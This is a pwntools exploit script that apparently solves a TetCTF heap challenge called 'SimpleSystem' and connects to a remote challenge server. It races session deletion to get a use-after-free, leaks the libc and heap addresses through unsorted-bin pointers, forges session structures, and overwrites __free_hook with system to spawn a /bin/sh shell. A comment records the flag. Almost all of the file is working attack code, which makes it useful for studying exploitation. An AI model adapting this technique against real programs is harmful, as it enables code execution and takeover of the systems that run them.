#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        if context.noptrace:
            return process(["./SimpleSystem.dbg"])
        else:
            return gdb.debug(["./SimpleSystem.dbg"], api=True)
    else:
        return remote("192.46.228.70", 33337)


CHOICE = "Enter your choice: \n"
FULLNAME = "Full name:\n"
USERNAME = "Username:\n"
PASSWORD = "Password:\n"
SIZEOF_NOTE = 0x18
SIZEOF_SESSION = 0x90
SYSTEM_OFF = 0x453A0
FREE_HOOK_OFF = 0x3C67A8


def choice(tube, n):
    # tube.sendlineafter(CHOICE, str(n))
    tube.sendline(str(n))


def finish(tube):
    tube.gdb.execute("finish &")
    time.sleep(0.1)
    while True:
        try:
            tube.gdb.parse_and_eval("$rip")
        except tube.gdb.error as ex:
            if "gdb.error: Selected thread is running." in ex:
                continue
            raise
        finally:
            break
    time.sleep(0.1)
    tube.gdb.wait()


def signin_pkt(username, password):
    return (
        b"1".ljust(8, b"\x00")
        + username.encode().ljust(0x2F, b"\x00")
        + password.encode().ljust(0x2F, b"\x00")
    )


def signin_expect(tube):
    tube.recvuntil(USERNAME)
    tube.recvuntil(PASSWORD)
    tube.recvuntil("Signin successully\n")


def signin(tube, username, password, debug, new_session):
    if not (debug and args.LOCAL and not context.noptrace):
        tube.send(signin_pkt(username, password))
        signin_expect(tube)
        return
    choice(tube, 1)
    tube.sendlineafter(USERNAME, username)
    tube.recvuntil(PASSWORD)
    tube.gdb.interrupt_and_wait()
    malloc_bp = tube.gdb.Breakpoint("malloc")
    tube.gdb.continue_nowait()
    tube.sendline(password)
    tube.gdb.wait()
    assert tube.gdb.parse_and_eval("$rdi") == 0x500
    finish(tube)
    print("(gdb) username = {}".format(tube.gdb.parse_and_eval("$rax")))
    tube.gdb.continue_and_wait()
    assert tube.gdb.parse_and_eval("$rdi") == 0x20
    finish(tube)
    print("(gdb) stored_md5 = {}".format(tube.gdb.parse_and_eval("$rax")))
    tube.gdb.continue_and_wait()
    assert tube.gdb.parse_and_eval("$rdi") == 0x21
    finish(tube)
    print("(gdb) current_md5 = {}".format(tube.gdb.parse_and_eval("$rax")))
    if new_session:
        tube.gdb.continue_and_wait()
        assert tube.gdb.parse_and_eval("$rdi") == 0x90
        finish(tube)
        print("(gdb) session = {}".format(tube.gdb.parse_and_eval("$rax")))
    tube.gdb.continue_nowait()
    tube.recvuntil("Signin successully\n")
    tube.gdb.interrupt_and_wait()
    malloc_bp.delete()
    tube.gdb.continue_nowait()


def signup_pkt(fullname, username, password):
    return (
        b"2".ljust(8, b"\x00")
        + fullname.encode().ljust(0x4FF, b"\x00")
        + username.encode().ljust(0x2F, b"\x00")
        + password.encode().ljust(0x2F, b"\x00")
    )


def signup_expect(tube):
    tube.recvuntil(FULLNAME)
    tube.recvuntil(USERNAME)
    tube.recvuntil(PASSWORD)
    tube.recvuntil("Signup successully\n")


def signup(tube, fullname, username, password):
    tube.send(signup_pkt(fullname, username, password))
    signup_expect(tube)


def add_note(tube, size, content):
    choice(tube, 1)
    good_prefix = b"Size: \n"
    bad_prefix = b"Permission denied\n"
    resp = tube.recvuntil((good_prefix, bad_prefix))
    if resp.endswith(bad_prefix):
        return None
    if args.LOCAL and not context.noptrace:
        tube.gdb.interrupt_and_wait()
        tube.gdb.Breakpoint("malloc", temporary=True)
        tube.gdb.continue_nowait()
    tube.sendline(str(size))
    if args.LOCAL and not context.noptrace:
        tube.gdb.wait()
        gdb_size = tube.gdb.parse_and_eval("$rdi")
        assert gdb_size == size, hex(gdb_size)
        finish(tube)
        print("(gdb) content = {}".format(tube.gdb.parse_and_eval("$rax")))
        tube.gdb.Breakpoint("malloc", temporary=True)
        tube.gdb.continue_nowait()
    tube.sendafter("Content: \n", content)
    if args.LOCAL and not context.noptrace:
        tube.gdb.wait()
        assert tube.gdb.parse_and_eval("$rdi") == SIZEOF_NOTE
        finish(tube)
        print("(gdb) note = {}".format(tube.gdb.parse_and_eval("$rax")))
        tube.gdb.continue_nowait()
    tube.recvuntil("New note id: ")
    return int(tube.recvline())


def edit_note(tube, id, content):
    choice(tube, 2)
    tube.sendlineafter("Note id: ", str(id))
    tube.sendafter("New content: ", content)


def show_information(tube):
    choice(tube, 3)
    tube.recvuntil("Hi ")
    username = tube.recvline()[:-1]
    tube.recvuntil("Your name: ")
    fullname = tube.recvline()[:-1]
    tube.recvuntil("Your id: ")
    id = int(tube.recvline())
    tube.recvuntil("You have ")
    suffix = " note(s)\n"
    n_notes = int(tube.recvuntil(suffix)[: -len(suffix)])
    return username, fullname, id, n_notes


def sleep_mode(tube, n):
    # tube.recvuntil(CHOICE)
    if args.LOCAL and not context.noptrace:
        tube.gdb.interrupt_and_wait()
        tube.gdb.Breakpoint("malloc", temporary=True)
        tube.gdb.continue_nowait()
    tube.sendline(str(4))
    if args.LOCAL and not context.noptrace:
        tube.gdb.wait()
        assert tube.gdb.parse_and_eval("$rdi") == 0x10
        finish(tube)
        print("(gdb) seconds = {}".format(tube.gdb.parse_and_eval("$rax")))
        tube.gdb.continue_nowait()
    tube.sendlineafter("Seconds: ", n)
    tube.recvuntil("goes to sleep mode\n")


def signout_and_delete(tube):
    choice(tube, 5)
    tube.recvuntil("Login Beta System")


def signout(tube):
    choice(tube, 6)
    tube.recvuntil("Login Beta System")


def gen(n):
    s = ""
    for _ in range(n):
        s += random.choice(string.ascii_letters)
    return s


def create_real_session(tube):
    fullname = "F" * 8 + gen(7)
    username = "U" * 8 + gen(7)
    password = "P" * 8 + gen(7)
    signup(tube, fullname, username, password)
    signin(tube, username, password, debug=True, new_session=True)
    signout(tube)
    return fullname, username, password


def create_arena_session(tube):
    fullname = "f" * 8 + gen(7)
    username = "u" * 8 + gen(7)
    password = "p" * 8 + gen(7)
    signup(tube, fullname, username, password)
    signin(tube, username, password, debug=False, new_session=True)
    sleep_mode(tube, "999")
    signout(tube)


def uaf_session(tube, username, password):
    signin(tube, username, password, debug=True, new_session=False)
    delay = 3
    sleep_mode(tube, str(delay))
    signout_and_delete(tube)
    signin(tube, username, password, debug=True, new_session=False)
    time.sleep(delay * 1.5)


def main_1(tube):
    if args.LOCAL and not context.noptrace:
        tube.gdb.Breakpoint("alarm", temporary=True)
        tube.gdb.continue_and_wait()
        tube.gdb.execute("set $rdi = 9999")
        tube.gdb.continue_nowait()
    # Create the real session.
    fullname1, username1, password1 = create_real_session(tube)
    # Allocate maximum possible arenas so that new threads go through
    # reused_arena().
    if args.LOCAL:
        n_arenas = 42
    else:
        n_arenas = 8
    for i in range(n_arenas):
        print("{}/{}".format(i + 1, n_arenas))
        create_arena_session(tube)
    # BUG: Accesses to the session array are not synchronized.
    # Schedule session deletion, logout and log back in. The resulting
    # session will be UAFed.
    uaf_session(tube, username1, password1)
    # Get libc address from unsorted bin links in the fullname chunk.
    (
        current_username,
        current_fullname,
        current_id,
        current_n_notes,
    ) = show_information(tube)
    assert current_fullname != fullname1.encode()
    (leak,) = struct.unpack("<Q", current_fullname.ljust(8, b"\x00"))
    libc = leak - 0x3C4B78
    print("libc = 0x{:x}".format(libc))
    assert libc & 0xFFF == 0
    # UAFed session's is_admin field was overwritten with an unsorted bin
    # link, so now we can create notes.
    # Leak heap.
    sleep_mode(tube, "0")
    """
(gdb) vmmap
0x0000000000827000 0x0000000000848000 0x0000000000000000 rw- [heap]
0x00007fc2126c1000 0x00007fc212881000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
(gdb) x/a 0x7fc212a851b0
0x7fc212a851b0 <mp_+80>:        0x827000
"""
    fake_session = flat(
        {
            0x00: b"SESSION\x00",
            0x08: struct.pack("<Q", 1),  # is_admin
            0x40: struct.pack("<Q", libc + 0x3C41B0 + 1),  # fullname
            0x78: struct.pack("<Q", 0),  # notes.count
            0x80: struct.pack("<Q", 0),  # notes.last
            0x88: struct.pack("<Q", 0),  # notes.first
        },
        length=0x90,
    )
    for _ in range(n_arenas):
        note_id = add_note(tube, SIZEOF_SESSION, fake_session)
        assert note_id is not None
        (
            current_username,
            current_fullname,
            current_id,
            current_n_notes,
        ) = show_information(tube)
        (heap,) = struct.unpack("<Q", (b"\x00" + current_fullname).ljust(8, b"\x00"))
        if heap & 0xFFF == 0 and heap < 0x10000000:
            print("heap = 0x{:x}".format(heap))
            break
    else:
        raise Exception("Could not leak heap")
    # free_hook = system.
    session_addr = heap + 0x580  # because gdb said so
    edit_note(tube, 0, flat(
        {
            0x00: b"/bin/sh\x00",  # fullname value
            0x08: struct.pack("<Q", 1),  # is_admin
            0x28: struct.pack("<Q", 0),  # fake_note.next
            0x30: struct.pack("<Q", 8),  # fake_note.size
            0x38: struct.pack("<Q", libc + FREE_HOOK_OFF),  # fake_note.content
            0x40: struct.pack("<Q", session_addr),  # fullname
            0x78: struct.pack("<Q", 1),  # notes.count
            0x80: struct.pack("<Q", session_addr + 0x28),  # notes.last
            0x88: struct.pack("<Q", session_addr + 0x28),  # notes.first
        },
        length=0x90,
    ))
    edit_note(
        tube,
        0,
        struct.pack("<Q", libc + SYSTEM_OFF),
    )
    signout_and_delete(tube)


def main():
    with connect() as tube:
        try:
            main_1(tube)
        finally:
             # TetCTF{vina: *100*50421406550161#}
            tube.interactive()


if __name__ == "__main__":
    main()
